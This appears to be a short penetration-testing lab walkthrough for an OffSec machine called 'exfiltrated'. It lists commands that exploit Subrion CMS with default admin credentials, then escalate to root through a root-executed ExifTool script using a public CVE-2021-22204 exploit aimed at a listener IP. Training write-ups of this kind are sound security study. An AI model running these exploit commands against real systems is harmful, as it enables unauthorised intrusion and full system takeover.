
- Initial Access was easy as they were using Subrion CMS.
```bash
 python 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
```
- Noticed a file /opt/image-exif.sh which is executed by root and has an exploit for exiftool

```
https://github.com/UNICORDev/exploit-CVE-2021-22204
```

```bash
 python3 exploit-CVE-2021-22204.py -s 192.168.45.206 80
```
